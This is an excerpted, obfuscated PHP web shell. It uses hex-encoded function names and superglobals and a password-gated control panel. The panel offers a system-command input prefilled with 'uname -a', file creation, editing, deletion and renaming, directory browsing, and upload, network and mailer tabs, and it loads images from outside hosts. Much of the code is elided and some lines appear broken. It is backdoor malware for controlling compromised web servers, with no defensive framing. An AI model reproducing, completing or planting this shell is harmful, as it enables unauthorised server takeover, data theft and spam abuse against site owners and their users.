...
function mtzynofaeq($string)
{
  $hex = '';
  for ($i = 0; $i < strlen($string); $i++) $hex .= dechex(ord($string[$i]));
  return $hex;
}
function aeiwghybqv($f, $t)
{
...
function pfrbutinvj($file)
{
  if ($perms = @"\x66\x69\x6c\x65\x70\x65\x72\x6d\x73"($file)) {
    ...
    return substr(sprintf('%o', filepfrbutinvj($file)), -4);
  }
}
function ledkpfsjvi($item)
{
...
if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
  ...
  if (isset(${"\x5F\x47\x45\x54"}['d'])) {
    $path = qfmvjziycg(${"\x5F\x47\x45\x54"}['d']);
    "\x63\x68\x64\x69\x72"(qfmvjziycg(${"\x5F\x47\x45\x54"}['d']));
  } else {
  ...
  $f = qfmvjziycg(${"\x5F\x47\x45\x54"}['f']);
  $fedit = qfmvjziycg(${"\x5F\x47\x45\x54"}['fedit']);
  ...
  $rmdir = qfmvjziycg(${"\x5F\x47\x45\x54"}['rmdir']);
  ...
  $rfile = qfmvjziycg(${"\x5F\x47\x45\x54"}['rfile']);
  ...
  echo '<a href="?"><img src="//bit.ly/ophelliaa" width="380" /></a><br /><button><a href="?"><b>HOME</b><a></button> <button><a href="' . $file . '?t=' . mtzynofaeq('upload') . '&d=' . mtzynofaeq($path) . '"><b>UPLOAD</b></a></button> <button><a href="' . $file . '?t=' . mtzynofaeq('network') . '&d=' . mtzynofaeq($path) . '"><b>NETWORK</b></a></button> <button><a href="' . $file . '?t=' . mtzynofaeq('mailer') . '&d=' . mtzynofaeq($path) . '"><b>MAILER</b></a></button> <button><a href="' . $file . '?t=' . mtzynofaeq('info') . '&d=' . mtzynofaeq($path) . '"><b>INFO</b></a></button> <button><a href="' . $file . '?exit"><b>LOGOUT</b></a></button><br /><form method="post" action=""><input id="ememm" type="text" name="gwejh" value="uname -a"> <input type="submit" value="X" /></form><br /><form method="get" action=""><input id="emem" type="text" name="mkfile" value="CreateFile.php"> <input type="hidden" name="d" value="' . mtzynofaeq($path) . '"> <input type="submit" value="X" /></form><form method="get" action=""><input id="emem" type="text" name="mkdir" placeholder="CreateDir"> <input type="hidden" name="d" value="' . mtzynofaeq($path) . '"><input type="submit" value="X" /></form><br /><form method="get" action=""><input id="ememm" type="text" name="cndir" value=' . $path . '>&nbsp;<input type="submit" value="X" /></form>';
  if (isset($gwejh)) {
    if (!empty($gwejh)) {
  ...
  if (isset($mkfile)) {
    echo '<form method="post" action=""><textarea rows="25" name="ftext"></textarea><br><div id="l"><br/><input type="text" name="fname" value="' . $mkfile . '"\> <input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . mtzynofaeq($path) . '">Back</a></button></div></form><br/>';
  ...
  if (isset($cndir)) {
    $dir = $cndir;
    $rr = ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . "$file?d=" . mtzynofaeq($dir);
    header("Location: http://$rr");
  }
  if (isset($rename)) {
    echo '<br/><br/><form method="post" action="">Old Name: <input type="text" name="oldname" value="' . qfmvjziycg(${"\x5F\x47\x45\x54"}['oldname']) . '" readonly> New Name: <input type="text" name="newname" value=""> <input type="submit" value="Execute"/> <button><a href="' . $file . '?d=' . mtzynofaeq($path) . '">Back</a></button></form><pre>';
  ...
  if (isset($f) and "\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"($f)) {
    ...
    echo '<textarea rows="25" name="text" readonly>' . $text . '</textarea><br/><br/><div id="l"><button><a href="' . $file . '?d=' . mtzynofaeq($path) . '">Back</a></button></div>';
  }
  if (isset($fedit) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($fedit)) {
    ...
    echo '<form method="post" action=""><textarea rows="25" name="text">' . $text . '</textarea><br><br/><div id="l"><input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . mtzynofaeq($path) . '">Back</a></button></div></form><br/>';
  ...
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    ...
    if ($files == ".." | $files == ".") {
      echo "<tr>\n                  <td><img src='//rei.my.id/fldr.png' /><b><a href='?d=" . mtzynofaeq("\x64\x69\x72\x6e\x61\x6d\x65"($path)) . "'>$files</a></b></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";
    } else {
      echo "<tr><td><img src='//rei.my.id/fldr.png' /><b><a href=$file?d=" . mtzynofaeq($path . '/' . $files) . ">$files</a></b></td><td id='c'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; / <a href=$file?rmdir=" . mtzynofaeq($files) . "&d=" . mtzynofaeq($path) . ">RM</a> / <a href=?rename&oldname=" . mtzynofaeq($files) . "&d=" . mtzynofaeq($path) . ">CN</a></td>\n                  <td id='c'>-</td>\n                  <td id='c'>" . acgiujtkdw($files) . "</td>\n                  <td id='c'>" . pfrbutinvj($files) . "</td>\n                  <td id='c'>" . ledkpfsjvi($files) . "</td>\n                  <td id='c'>" . hridbnasul($files) . "</td>\n              </tr>";
    }
  }
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    if (!is_file($files)) continue;
    echo "<tr><td><img src='//rei.my.id/file.png' /><a href=$file?f=" . mtzynofaeq($files) . " &d=" . mtzynofaeq($path) . ">$files</a></td><td id='c'><a href=$file?fedit=" . mtzynofaeq($files) . "&d=" . mtzynofaeq($path) . ">ED</a> / <a href=$file?rfile=" . mtzynofaeq($files) . "&d=" . mtzynofaeq($path) . ">RM</a> / <a href=?rename&oldname=" . mtzynofaeq($files) . "&d=" . mtzynofaeq($path) . ">CN</a></td>\n            <td id='c'>" . vftpomyuqs($files) . "</td>\n            <td id='c'>" . acgiujtkdw($files) . "</td>\n            <td id='c'>" . pfrbutinvj($files) . "</td>\n            <td id='c'>" . ledkpfsjvi($files) . "</td>\n            <td id='c'>" . hridbnasul($files) . "</td>\n        </tr>";
  }
